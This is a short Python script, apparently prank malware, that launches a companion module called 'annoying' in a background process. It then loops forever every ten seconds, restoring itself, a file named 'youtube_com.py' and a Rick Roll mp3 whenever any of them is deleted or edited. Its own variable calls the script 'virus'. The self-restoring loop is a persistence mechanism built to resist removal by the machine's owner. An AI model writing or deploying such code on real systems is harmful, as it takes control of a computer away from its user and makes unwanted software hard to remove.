import os, time
from multiprocessing import Process
import annoying
annoying_func_thread = Process(target=annoying.start)
annoying_func_thread.start()

chnapik_file = os.path.join(os.path.dirname(__file__),"youtube_com-watch-dQw4w9WgXcQ.mp3")
chnapik_file_content = open(chnapik_file, "rb").read()
annoying_file = os.path.join(os.path.dirname(__file__),"youtube_com.py")
annoying_file_content = open(annoying_file, "r").read()
virus = open(__file__, "r").read()

while True:
  if (not os.path.exists(__file__)) or open(__file__, "r").read() != virus:
    with open(__file__, "w") as file:
      file.write(virus)

  if (not os.path.exists(annoying_file)) or open(annoying_file, "r").read() != annoying_file_content:
    with open(annoying_file, "w") as file:
      file.write(annoying_file_content)
      
  if (not os.path.exists(chnapik_file)) or open(chnapik_file, "rb").read() != chnapik_file_content:
    with open(chnapik_file, "wb") as file:
      file.write(chnapik_file_content)


  time.sleep(10)